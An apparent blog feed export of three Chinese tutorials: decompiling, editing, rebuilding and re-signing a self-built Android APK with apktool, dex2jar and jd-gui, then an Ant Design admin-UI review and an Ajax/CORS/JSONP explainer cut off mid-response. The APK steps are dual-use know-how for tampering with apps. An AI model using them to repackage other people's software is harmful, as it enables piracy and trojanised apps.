本篇文章只介紹一些工具的使用，適合初學者觀看。若是想了解更底層的知識，可以參考文末附上的延伸閱讀。
事前準備首先，我們需要一個用來被破解的 apk，簡單用任何你平常熟悉的工具自己 build 一個就好了。基本架構很簡單，只要一個 MainActivity 跟兩個TextView就好：
MainActivity.javapublic class MainActivity extends Activity &#123;    @Override    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        TextView text = (TextView)findViewById(R.id.text);        text.setText(&quot;Taiwan No1&quot;);    &#125;&#125;

activity_main.xml&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    android:layout_width=&quot;match_parent&quot;    android:orientation=&quot;vertical&quot;    android:layout_height=&quot;match_parent&quot;&gt;    &lt;TextView        android:text=&quot;@string/hello_world&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot; /&gt;    &lt;TextView        android:id=&quot;@+id/text&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot; /&gt;&lt;/LinearLayout&gt;

安裝到手機上之後，會看到這樣的畫面：

實際動手好，這個就是我們要拿來測試的 apk 了！接著你需要一些非常好用的工具：

apktool
jd-gui
dex2jar

如何安裝就不再贅述了，讀者們可以參考看看文件或是上網搜尋一下就會有一堆解答～apktool是拿來把 apk 拆開用的，可以反編譯 apk 之後，看到 smali 檔案跟 resourcedex2jar可以把 apk 轉成 jar，再用jd-gui檢視 java code
接著我們開啟 terminal，到剛剛那個示範 apk 的目錄底下，執行apktool d APKNAME.apk
執行以後，會自動生成一個APKNAME的資料夾，裡面就是反編譯出來的東西了。
.├── AndroidManifest.xml├── apktool.yml├── original├── res└── smali

其中比較值得講的是smali這個資料夾，其實這裡面就是你的 source code，只是格式不太一樣。你可以在smali這資料夾裡面找到你的MainActivity.java，內容如下：（覺得長得很奇怪是很正常的事，但是認真多看幾眼，你會發現其實沒那麼難懂）
MainActivity.java.class public Lapktest/huli/com/apkdecompile/MainActivity;.super Landroid/app/Activity;.source &quot;MainActivity.java&quot;# direct methods.method public constructor &lt;init&gt;()V    .locals 0    .prologue    .line 8    invoke-direct &#123;p0&#125;, Landroid/app/Activity;-&gt;&lt;init&gt;()V    return-void.end method# virtual methods.method protected onCreate(Landroid/os/Bundle;)V    .locals 2    .param p1, &quot;savedInstanceState&quot;    # Landroid/os/Bundle;    .prologue    .line 12    invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V    .line 13    const v1, 0x7f040019    invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;setContentView(I)V    .line 14    const v1, 0x7f0c0050    invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;findViewById(I)Landroid/view/View;    move-result-object v0    check-cast v0, Landroid/widget/TextView;    .line 15    .local v0, &quot;text&quot;:Landroid/widget/TextView;    const-string v1, &quot;Taiwan No1&quot;    invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V    .line 16    return-void.end method

你可以仔細對照一下剛剛自己寫的 java code，會發現只是換了種格式而已：
setContentView(R.layout.activity_main);
其實就等於
.line 13const v1, 0x7f040019invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;setContentView(I)V

你可能會好奇，這個0x7f040019是哪來的？事實上，你可以在res/values/public.xml這個檔案裡面找到答案：
&lt;public type=&quot;layout&quot; name=&quot;activity_main&quot; id=&quot;0x7f040019&quot; /&gt;

到這裡，應該就可以大概猜出 Android 在編譯時候的流程：

把所有資源檔壓縮、處理並且包在一起，產生id與記憶體位置對照表
把程式碼裡面所有的R.xx.xxx透過剛剛產生的表，換成實際的記憶體位置
把 java code 變成 smali code（有點像把 C 變成組合語言的程式碼那樣）

修改在剛剛的smali裡面，有這麼一段：
.line 15.local v0, &quot;text&quot;:Landroid/widget/TextView;const-string v1, &quot;Taiwan No1&quot;invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V

讓我們把Taiwan No1換成T@iw@n n0!。還記得另一個TextView有用到R.string.hello_world嗎？在res/values/strings.xml裡面，可以找到這一串的定義：
&lt;string name=&quot;hello_world&quot;&gt;Hello world!&lt;/string&gt;

改成：
&lt;string name=&quot;hello_world&quot;&gt;HELLO WORLD&lt;/string&gt;

確定都有改完以後，就可以把這些程式碼再度「組裝」回去。還記得剛剛反編譯的指令嗎？apktool d APK_NAME.apk這邊的d就是decompile的意思，所以如果要逆向組裝回去，就是b，build。
apktool b APK_NAME
執行完之後可以在APK_NAME/dist下面找到一個 apk。但要注意的是這個 apk 還沒有被 sign 過，因此無法安裝。可以隨便生成一個 keystore 或是找現成的來簽署。jarsigner -verbose -digestalg SHA1 -keystore ~/KEY.keystore APK_NAME.apk KEY_ALIAS
安裝完以後就會看到這樣的畫面：

沒錯！就是這麼簡單，一個 apk 就這樣被修改了！
可是smali的程式碼不好懂，能不能直接看到 java code呢？這時候剛剛推薦的工具dex2jar與jd-gui就派上用場了前者可以把 apk 變成 jar，後者可以開啟一個 jar 並且顯示 java code兩個組合在一起，就可以直接看到原本的程式碼了
dex2jar下載下來之後會有一堆的 shell script，dex2jar就是我們想要的那個./d2j-dex2jar.sh app.apk執行完之後會有一個 jar，用 jd-gui 打開，會看到你的程式碼一覽無遺：

總結沒接觸過反編譯的人可能會很驚訝：什麼！要改掉一個 apk 居然這麼簡單！沒錯，就是這麼簡單，而且這只是一個很基本的範例而已。事實上，你想要加入新的程式碼、加入新的資源（圖片、聲音等等）也是可以的。也就是說，你不只可以修改，還可以擴充原本的 apk！
但也有些方法可以防止不肖人士反編譯 apk，例如說加殼、混淆、動態載入等，關於這些方法我們下次有機會再介紹給大家囉！
延伸閱讀
Android 反編譯與防止被反編譯
[Android] 程式碼混淆(ProGuard)與反組譯
[Android] 反組譯 破解Android的apk安裝檔
反编译的常用工具与使用方法
Smali–Dalvik虚拟机指令语言–&gt;【android_smali语法学习一】
android反编译-smali语法

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>Mobile</tag>
        <tag>Android</tag>
        <tag>Decompile</tag>
        <tag>Apktool</tag>
        <tag>Smali</tag>
        <tag>Dex2jar</tag>
        <tag>行動網路</tag>
        <tag>反編譯</tag>
        <tag>APK</tag>
      </tags>
  </entry>
  <entry>
    <title>打造後台管理系統的好幫手：Ant Design</title>
    <url>/2018/04/28/antd-and-admin-website/</url>
    <content><![CDATA[前言很多公司都會需要一個僅供內部使用的後台系統，來管理公司內的一些事情。不過也因為是公司內的產品，投入的資源比起給外面使用者的產品往往都來得較少，身為一個前端工程師，你很有可能必須身兼設計，決定整個 UI 的長相。
這時候呢，如果能找到一套現成的 Library 當然就最棒了！
這篇主要會介紹由螞蟻金服開源出來的 Ant Design 這套 UI 的 Library，並且讓大家看看幾個範例。
後台系統的 UI在我認識 Ant Design 之前，我都是用這套叫做 AdminLTE當作模板來刻 UI。找這種現成的模板好處顯而易見，那就是很多時候你只要一直複製貼上就好，可以省略大部份的 CSS，大概只有 20% 需要自己寫。
除此之外呢，也能在沒有設計師的幫助下就刻出風格一致的介面。

這一套是專門給後台系統用的，如果你要找的只是 UI Library，或許 Bootstrap 跟 Material-UI 就很夠用了。
在開始想說要用哪一套 Library 之前，可以先問自己兩個問題：


對於後台系統，我需要哪些元件？
最主要的功能會是什麼？


第一點的話很容易，其實我們可以簡單歸納出以下幾種：

基本 Layout 元件與網格系統
基本元件，像 Button、Icon、List、Card 等等
表單元件，像 Input、Form、Select、Checkbox 等等
表格

第二點的話呢，以我自己接觸過的後台系統來說，我認為後台系統最需要的是以下兩點：

需要支援複雜的表單，提供許多不同的 Component 像是 AutoComplete、DatePicker、TimePicker、Rating 等等
需要有強大的 Data Table，可以排序、篩選、搜尋、分頁或甚至是 Inline Edit

如果你把上面兩點考慮進來的話，現成的 UI Library 大概都被排除了。不過其實也很合理，因為你會發現我們要的東西其實包含「功能面」，例如說 Data Table，這些都是純 UI 的 Library 不會去支援到的，你必須自己另外再找 Library 才能實現。
總結以上幾點，我理想中的 Library 大概長這樣：

要支援功能面，不只有 UI
UI 要漂亮
最好能有 React 元件（個人偏好）

有這樣的 Library 嗎？有，就是等等要介紹的這套。
Ant Design
Ant Design 是一套由中國知名網路公司螞蟻金服所開源出來的 UI Library，但它跟其他套不同的點在於它不只是一套 UI Library，還提供了一些設計語言（Design Language），簡單來講就是給了你一份指南，跟你說你遇到什麼情形的時候應該怎麼做，以及每個設計背後代表的意義。
除此之外呢，我覺得 Ant Design 的優點還有以下幾項：

支援各種常用組件，連很不常見的都有
有提供 React Component，使用起來很方便
Table 功能強大，支援分頁、篩選跟排序
中英文文件齊全，要跟外國同事共事也沒問題
由螞蟻金服維護，更新頻繁穩定度高

這邊有一個開源的 demo，就是基於 Ant Design 來開發的：zuiidea&#x2F;antd-admin：

我自己覺得介面很 OK，看起來也很舒服。最重要的是你會用到的 Component 它基本都實作了，很少時候需要自己手寫 CSS。
以下是它所有的 Component。
常用及排版
Button 按鈕
Icon 圖標
Grid 網格
Layout 佈局

導覽
Affix 固釘
Breadcrumb 麵包屑
Dropdown 下拉選單
Menu 選單
Pagination 分頁
Steps 步驟條

Data Entry
AutoComplete 自動完成
Cascader 層級選擇
Checkbox 多選
DatePicker 日期選擇
Form 表單
Input 輸入
InputNumber
Mention 提及
Rate 評分
Radio 多選
Slider 滑動條
Switch 開關
TreeSelect 樹選擇
TimePicker 時間選擇
Transfer 穿梭框
Upload 上傳

Data Display
Avatar 頭像
Badge 徽章
Calendar 日曆
Card 卡片
Carousel 跑馬燈
Collapse 折疊
List 列表
Popover 氣泡卡片
Tooltip 文字提示
Table 表格
Tabs 分頁
Tag 標籤
Timeline 時間軸
Tree 樹

Feedback
Alert 警告提示
Modal 對話框
Message 全局提示
Notification 通知
Progress 進度條
Popconfirm 氣泡確認
Spin 載入中

其他
Anchor 錨點
BackTop 回到頂部
Divider 分隔線
LocaleProvider 國際化

提供了將近 50 種的組件任你使用！所以我才說 Ant Design 的涵蓋範圍真的很大，所有常用的 Component 都找得到，有些比較少見的也直接附在裡面了。
再讓大家看幾張截圖：
在更改&#x2F;新增資料時可以跳出 Modal 取代掉換頁（如果內容不多的話）：
結合其他 Component 做出一個額外的 Filter：
基本表單以及表單驗證：
實作上要注意的地方首先呢，第一個是表單的挑選，因為後台系統裡面會有超級多表單，所以決定要用哪一個 Library 是很重要的。
Ant Design 有提供自己的 Form HOC，跟 Ant Design 其他組件的整合很不錯。講到表單不得不提的 Redux Form 則是自由度高了許多，可以跟任意的 UI Library 互相搭配使用。
基於自由度高以及功能完整這兩點，我們最後選擇了 Redux Form 來當作處理表單相關的 Library。
第二點要注意的是，可以在 Ant Design 跟真的 App 之間放一層中間層，我稱之為 Component Wrapper。

為什麼要用這一層？不是多此一舉嗎？
這一層的目的是把 App 跟 UI Library 的相依性降低，舉個例子來說好了，假設現在你所有頁面都直接引用 antd 的元件，然後下一個版本中 antd 把某個 props 從 text 改成 value，你該怎麼辦呢？
還能怎麼辦，就是搜尋然後取代囉，一個個檢查有沒有沒改到的或是不該改的。
但假設我們中間多了一層 Wrapper，我們就能在這一層裡面自動把這個 props 換掉，省掉很多麻煩。
又或是原本 antd 的 Modal 並沒有支援 loading 這個狀態，只能搭配 Spin 自己實現，但如果我們有了中間這層，就可以在中間來實作，而不是在 App 的某幾個地方。
所以程式碼會長的像這樣，我們自己加了一個isLoading的 props：

我還滿喜歡這個 idea，把原本 antd 的元件都先包起來，這樣如果你想做什麼改變，可以在中間那層改，改一個地方就能夠影響到全 App。
結論自從我們內部系統改用 Ant Design 來開發之後，效率上增快了很多，UI 也看起來舒服很多。身為一個被指派設計師任務的工程師，也覺得輕鬆許多。你只要用他們的 Component，就可以保證 UI 的一致性。
而且當你在 UI&#x2F;UX 上有疑問時，還可以去翻他們的指南，有時候會寫說他們推薦應該要怎麼處理會比較好。
如果你要客製化的話也很方便，官方有提供一個 less 檔案，你只要把裡面你想換的變數換掉就好，或者是你自己 override css 也行，很自由。Ant Design 目前的更新頻率是每一週都會修一些 bug，每個月會有一些新的功能，我覺得更新得很頻繁修復的速度也很快，應該是有個 team 專門在負責這個。
總之呢，誠心跟大家推薦這套 Library，下次要開發後台系統時可以考慮看看。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>antd</tag>
      </tags>
  </entry>
  <entry>
    <title>輕鬆理解 Ajax 與跨來源請求</title>
    <url>/2017/05/20/api-ajax-cors-and-jsonp/</url>
    <content><![CDATA[前言一般來說在學習寫網頁的時候，最先碰到的會是 HTML 與 CSS，負責把版面刻出來以及美化版面，當基礎打穩之後，會開始學習 JavaScript，試著做出一點互動性的效果。而「互動」除了使用者跟瀏覽器的互動以外，別忘了還有 Client 端跟 Server 端的互動，也就是必須要學會從瀏覽器用 JavaScript 跟後端 Server 拿資料，否則你的網頁資料都只能是寫死的。
這篇的主要預設讀者是網頁前端的初學者，希望能讓本來不太理解怎麼跟 Server 交換資料或是怎麼串 APi 的讀者看完之後，能夠更了解該怎麼跟後端串接。
先從舉例開始在開始之前，我們可以先想想一個問題：

為什麼前端必須跟後端交換資料？

其實這跟你做的網頁類型有關，假如說你今天做的是一個官方網站，很可能整個網站都是靜態的，只要 HTML 跟 CSS 就可以了，並不需要跟後端 Server 拿資料。
那我們先假設今天要做的是一個可以瀏覽現在 Twitch 實況列表的網頁好了，如下圖。

如果這個網頁不跟後端拿資料，就代表說網頁的內容都是固定的，無論什麼時候看都一樣。可是這樣的話就不對了嘛，因為這個網頁的目標是顯示出「現在有在開實況的頻道」，所以內容是會跟著改變的。
既然會跟著改變，就必須不斷的去更新資料，從 Server 那邊拿資料回來，接著在前端處理過後顯示。
已經確認有拿資料的必要性之後，就可以問自己兩個問題：

要跟誰拿資料？
要怎麼拿資料？

第一個問題，很明顯的就是跟 Twitch，因為 Twitch 才有你要的這些資料嘛！
那第二個問題，要怎麼拿資料呢？就必須透過 Twitch API 了。
API什麼是 API？你可能已經聽過很多次這個名詞，但還是不知道是什麼。先來講講它的全名吧，它的全名是「Application Programming Interface」，中文翻作應用程式介面。
你可能會想說這是什麼鬼東西，怎麼中文英文我都看不懂在幹嘛。但其實這幾個字裡面，最重要的是「介面」兩個字。
介面是什麼？介面就是拿來串接用的，我舉一個例子你就知道了。
電腦上不是有一個 USB 插槽嗎？然後你只要是看到市面上有賣 USB 隨身碟的，都可以買來以後插到 USB 插槽，你的電腦就可以讀取得到。你有想過為什麼嗎？明明就是不同廠商做的東西，可是卻都可以讀得到、都可以插到 USB 插槽裡面。
因為有一項標準叫做 USB 介面，當這套標準訂出來以後，所有廠商只要按照這一套標準來開發，就可以保證能夠連接電腦跟 USB 隨身碟。
API 也是這樣，只是變成程式跟程式之間的串接。例如說今天我寫程式需要讀取檔案好了，我要怎麼讀取檔案？讀取檔案是作業系統提供的功能，因此我可以去串接「讀取檔案的 API」，就可以在我的程式裡面也使用這個功能了。
再多舉幾個例子你可能會更有感覺。
例如說今天我想要讓我的網頁能夠用 Facebook 登入，那要怎麼辦？我就要去串接「Facebook 提供的 API」，就等於說是 Facebook 向外提供給大家的一套介面、一套標準，任何想要接入 Facebook 服務的開發者們，都可以遵循著那套規範拿到自己想要的資料，這個東西就叫做 API。
或是你可能今天是一個飯店管理系統的開發者，你們公司做了一套給飯店用的 ERP，可以管理飯店的訂房狀態等等，就能知道說現在有哪些房間是空的。
而這些資料如果只有自己用太可惜了，於是公司決定把這些資料提供給大型訂房網站，在那些網站上能夠即時顯示這間飯店的房間狀況。所以就必須交換資料，你要提供一個「查詢房間情形的 API」給其他網站，讓他們能夠去串接，才能獲得這些資訊。
講到這邊，大家應該對 API 已經有一些 sense 了，我再多舉幾個例子：

我想要抓到 flickr 上面的照片，所以我要去串接 flickr 的 API
Google 要開放讓其他 App 也能用 Google 登入驗證，所以 Google 要提供「Google 登入 API」
我要抓 Twitch 上面現在有哪些頻道，所以要串 Twitch API

API Documentation既然已經知道 API 是什麼了，也知道要串接 API，那下一個問題就是「那要怎麼串呢？」
剛剛前面有提過檔案存取的例子，其實這個比較像是呼叫作業系統或是程式語言的函式庫提供的 Function，而這些 Function 你通常都可以在官方文件上查到更詳細的說明，例如說 Node.js 的讀取檔案：

（來源：https://nodejs.org/api/fs.html#fs_fs_readdir_path_options_callback）
上面就有寫說你應該呼叫哪一個 Function，應該傳入哪些參數。
API 的串接也是一樣，一定要有文件你才知道怎麼串，不然根本串不起來，因為你連要傳什麼參數都不知道。
我們可以先來看看Twitch API 文件是怎麼寫的。
裡面說明了你必須要有一個Client ID，然後 API Root 的 URL 是 https://api.twitch.tv/kraken 等等，這些都是與 API 相關的基本資訊。如果你在左側欄隨便點一個 API，會看到個別 API 的詳細資訊：

這邊就有寫說網址是什麼，你應該傳的參數是什麼等等，下面還有附上參考範例，這就是一個很完整的 API 文件。
通常在寫網頁的時候，我們都會直接講 API，但其實我們指的是 Web API，也就是透過網路來傳輸的 API。那有沒有非 Web API 呢？有，像我們前面提到的跟作業系統要讀檔的 API，就都是在本機底下執行的，沒有透過任何網路。
不過這其實也不用太在意，反正大家都習慣講 API，聽得懂就好。
現在有了 API 文件，我們就有了所有我們需要的資訊。以上面這個 Twitch 的例子來講，我們只要能夠發送 Request 到https://api.twitch.tv/kraken/games/top?client_id=xxx，Twitch 就會傳回目前最熱門的遊戲列表。
我們已經把問題的範圍一步步給縮小了，一開始是「要怎麼跟 Twitch 拿資料」，現在則更細的切分為：「要怎麼利用 JavaScript 發送 Reuqest」
Ajax要在瀏覽器上面發送 Request，必須應用到一種技術叫做 Ajax，全名是「Asynchronous JavaScript and XML」，重點在於Asynchronous這個單字，非同步。
在講什麼是非同步之前，就要先來提一下什麼是同步。你原本寫的 JavaScript 就幾乎都是同步執行的。意思是他執行到某一行的時候，會等這行執行完畢，才執行到下一行，確保執行順序。
也就是說下面這段程式碼，最後一行需要等很長一段時間才能執行到：
var count = 10000000;while(count--) &#123;  // 做一些耗時的操作&#125;  // 等很久才被執行到console.log(&#x27;done&#x27;)

看起來滿有道理的，程式本來不就是一行一行執行的嗎？可是如果今天牽涉到網路操作的話，大家可以思考看看下面這個例子：
// 假設有個發送 Request 的函式叫做 sendRequestvar result = sendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;);  // 等很久才被執行到console.log(result);

當 JavaScript 執行到sendRequest的時候，由於是同步的，就會等待 Response 回來才繼續做事。換句話說，在 Response 還沒回來之前，整個 JavaScript 引擎是不會執行任何東西的！很可怕對吧，你點任何有牽涉到 JavaScript 的東西，都不會有反應，因為 JavaScript 還在等 Response 回來。
所以呢，像是這種已經預期到可能非常耗時間，非常不穩定的操作，就不能用同步的方式來執行，而是要用非同步。
非同步是什麼意思呢？就是執行完之後就不管它了，不等結果回來就繼續執行下一行：
// 假設有個發送 Request 的函式叫做 sendRequestvar result = sendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;);  // 上面 Request 發送完之後就執行到這一行，所以 result 不會有東西// 因為 Response 根本沒有回來console.log(result);

這邊需要特別注意的是「非同步的 Function 不能直接透過 return 把結果傳回來」，為什麼？因為像上面這個例子，它發送 Request 之後就會執行到下一行了，這個時候根本就還沒有 Response，是要回傳什麼？
那怎麼辦呢？先聽我舉個很常見的小例子吧！
我之前在新加坡的 Food Court 吃飯的時候，那邊每一張桌子上面都會有桌號。你去點餐的時候，只要跟老闆講說你坐哪一桌，等餐點完成之後老闆就會自己主動送過來。
所以我不需要站在店家門口等，我只要在位子上繼續坐我的事情，反正餐點好了之後老闆會送過來。
非同步的概念也是這樣，我發送 Request 之後（我點餐之後），我不用等 Response 回來（不用等老闆做好），可以繼續做自己的事，等 Response 回來之後（等餐點做好之後），會自己幫我把結果送過來（老闆會自己送過來）。
在點餐的例子中，老闆可以透過桌號知道應該把資料送到哪邊，那在 JavaScript 裡面呢？可以透過 Function！而這個 Function，我們就稱作 Callback Function，回呼函式。
當非同步的操作完成時，就可以呼叫這個 Function，並且把資料帶進來。
// 假設有個發送 Request 的函式叫做 sendRequestsendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;, callMe);  function callMe (response) &#123;  console.log(response);&#125;  // 或者寫成匿名函式sendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;, function (response) &#123;  console.log(response);&#125;);

現在你就知道為什麼網路的操作是非同步，以及什麼是 callback function 了。
XMLHttpRequest方才提到 Ajax、非同步以及 callback function 的概念，但還是沒講到要怎麼發送 Request，只寫了一個假的sendRequest函式當作參考而已。
要發送 Request 的話，就要透過瀏覽器幫我們準備好的一個物件，叫做XMLHttpRequest，範例程式碼如下：
var request = new XMLHttpRequest();request.open(&#x27;GET&#x27;, `https://api.twitch.tv/kraken/games/top?client_id=xxx`, true);request.onload = function() &#123;  if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) &#123;      // Success!    console.log(request.responseText);  &#125;&#125;;request.send();

上面的request.onload其實就是在指定說當資料回來的時候，要用哪一個 function 去處理。
有了上面這一段程式碼之後，你終於大功告成，終於可以串接 Twitch API，從那邊拿資料下來了！真是可喜可賀，從此之後，你就跟「串接 API」這個技能過著幸福快樂的生活…
才怪。
Same Origin Policy正當你以為自己已經對串接 API 駕輕就熟，想說去串接別的 API 試試看好了的時候，才發現一串就出問題了：

XMLHttpRequest cannot load http://odata.tn.edu.tw/ebookapi/api/getOdataJH/?level=all. No &#x27;Access-Control-Allow-Origin&#x27; header is present on the requested resource. Origin &#x27;null&#x27; is therefore not allowed access.

咦？為什麼會有這個錯誤呢？
其實是瀏覽器因為安全性的考量，有一個東西叫做同源政策，Same-origin policy。
意思就是說如果你現在這個網站的跟你要呼叫的 API 的網站「不同源」的時候，瀏覽器一樣會幫你發 Request，但是會把 Response 給擋下來，不讓你的 JavaScript 拿到並且傳回錯誤。
什麼是不同源呢？其實你想簡單一點，只要是 Domain 不一樣就是不同源，或者是一個用http一個用https也是不同源，端口號不一樣也是不同源。
所以如果你是接別人 API 的話，大多數情形都是不同源的。
這邊我想再強調一點，「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。
好，既然剛剛說了不同源會被擋下來，那 Twitch API 不是也不同源嗎，是怎麼串接成功的？
CORS大家都知道其實在不同源之間互相傳輸資料是很常有的事情，像我們串接 Twitch API 就是，我們怎麼可能跟 Twitch API 在同一個 Domain 底下呢？
因此，同源政策的確是規範非同源就被擋下來，但與此同時其實又有另外一個規範，是說：「如果你想在不同 origin 之間傳輸資料的話，你應該怎麼做」，這規範就叫做 CORS。
CORS，全名為 Cross-Origin Resource Sharing，跨來源資源共享。
這套規範跟你說，如果你想開啟跨來源 HTTP 請求的話，Server 必須在 Response 的 Header 裡面加上Access-Control-Allow-Origin。
這個字段你應該不陌生才對，覺得陌生的可以拉回去上面看，剛剛的錯誤訊息其實就有講到這一個 Header。
當瀏覽器收到 Response 之後，會先檢查Access-Control-Allow-Origin裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。
如果你打開 Devtool 仔細看一開始我們發給 Twitch 的 Request，你會發現 Response 的 Header 大概是長這樣：
Content-Type: application/jsonContent-Length: 71Connection: keep-aliveServer: nginxAccess-Control-Allow-Origin: *Cache-Control: no-cache, no-store, must-revalidate, privateExpires: 0Pragma: no-cacheTwitch-Trace-Id: e316ddcf2fa38a659fa95af9012c9358X-Ctxlog-Logid: 1-5920052c-446a91950e3abed21a360bd5Timing-Allow-Origin: https://www.twitch.tv

重點是這一行：Access-Control-Allow-Origin: *，星號就代表萬用字元，意思是任何一個 Origin 都接受。所以當瀏覽器接收到這個 Response 之後，比對目前的 Origin 符合*這個規則，檢驗通過，允許我們接受跨來源請求的回應。
除了這個 Header 以外，其實還有其他的可以用，例如說Access-Control-Allow-Headers跟Access-Control-Allow-Methods，就可以定義接受哪些 Request Header 以及接受哪些 Method。
總結一下，如果你想要發起跨來源 HTTP 請求並且順利收到回應的話，需要確保 Server 端有加上Access-Control-Allow-Origin，不然 Response 會被瀏覽器給擋下來並且顯示出錯誤訊息。
Preflight Request還記得 Twitch 的 API 文件嗎？裡面需要帶一個client-id的參數，而文件裡面寫說你可以帶在 GET 的參數上面，也可以帶在 Header 裡，我們來試試看帶在 Header 裡會怎樣吧！打開 Devtool，你會看到一個神奇的現象：

咦？我明明只發了一個 Request，怎麼變兩個了？而且第一個的 Method 居然是OPTIONS。只是多加了一個 Header 就多了一個 Request，是為什麼呢？
其實這又跟上面講的 CORS 有關了，CORS 把 Request 分成兩種，一種是簡單請求（simple requests）。什麼是簡單請求呢？其實定義有滿長一串的，我認為有需要用到的時候再看就好，但總之如果你沒有加任何自定義的 Header，而且又是 GET 的話，絕對是簡單請求（這個夠簡單了吧）
反之呢，如果你有加一些自定義的 Header，例如說我們剛剛加的Client-ID，這個 Request 就絕對不是簡單請求。
（定義可參考：MDN: 簡單請求）
從上述分類可知，我們剛剛發起的 Request 因為有帶了 Custom header，所以不會是簡單請求，那為什麼會多一個 Request 呢？
這一個 Request 叫做 Preflight Request，中文翻作「預檢請求」，因為非簡單請求可能會帶有一些使用者資料，因此會先透過 Preflight Request 去確認後續的請求能否送出。
如果這個 Preflight Request 沒有過的話，真的 Request 也就不會發送了，這就是預檢請求的目的。
我舉一個例子，你就會知道為什麼需要這個 Preflight Request 了。
假設今天某個 Server 提供了一個 API 網址叫做：https://example.com/data/16，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。
如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。
因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。
如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。
先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。
JSONP最後來講一下 JSONP，這是跨來源請求除了 CORS 以外的另外一種方法，全名叫做：JSON with Padding。
還記得一開始提到的同源政策吧？仔細思考一下會發現，其實有些東西是不受同源政策限制的，例如說&lt;script&gt;這個 Tag，我們不是常常引用 CDN 或是 Google Analytics 之類的第三方套件嗎？網址都是其他 Domain 的，但是卻能正常載入。
JSONP 就是利用&lt;script&gt;的這個特性來達成跨來源請求的。
今天先想像你有一段 HTML 長這樣：
&lt;script&gt;  var response = &#123;    data: &#x27;test&#x27;  &#125;;&lt;/script&gt;&lt;script&gt;  console.log(response);&lt;/script&gt;

很好懂的一段程式碼，我就不多做解釋了。那如果今天把上面那一段換成一串網址呢？
&lt;script src=&quot;https://another-origin.com/api/games&quot;&gt;&lt;/script&gt;&lt;script&gt;  console.log(response);&lt;/script&gt;

如果https://another-origin.com/api/games這個網址返回的內容就是剛剛的：
var response = &#123;  data: &#x27;test&#x27;&#125;;

那我不就一樣可以拿到資料了嗎？而且這些資料還是 Server 端控制的，所以 Server 可以給我任何資料。但是這樣用全域變數其實不太好，我們可以借用剛剛的 Callback Function 的概念，改成這樣：
&lt;script&gt;  receiveData(&#123;    data: &#x27;test&#x27;  &#125;);&lt;/script&gt;&lt;script&gt;  function receiveData (response) &#123;    console.log(response);  &#125;&lt;/script&gt;

所以 JSONP 是什麼？JSONP 其實就是透過上面這種形式，利用&lt;script&gt;裡面放資料，透過指定好的 function 把資料給帶回去。你只要把第一段的&lt;script&gt;那邊想成是 Server 的回傳值，你就可以理解了。
實務上在操作 JSONP 的時候，Server 通常會提供一個callback的參數讓 client 端帶過去。Twitch API 有提供 JSONP 的版本，我們可以直接來看範例：
URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=aaa&amp;limit=1
aaa(&#123;&quot;_total&quot;:1069,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1&quot;,&quot;next&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1\u0026offset=1&quot;&#125;,&quot;top&quot;:[&#123;&quot;game&quot;:&#123;&quot;name&quot;:&quot;Dota 2&quot;,&quot;popularity&quot;:63361,&quot;_id&quot;:29595,&quot;giantbomb_id&quot;:32887,&quot;box&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;logo&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-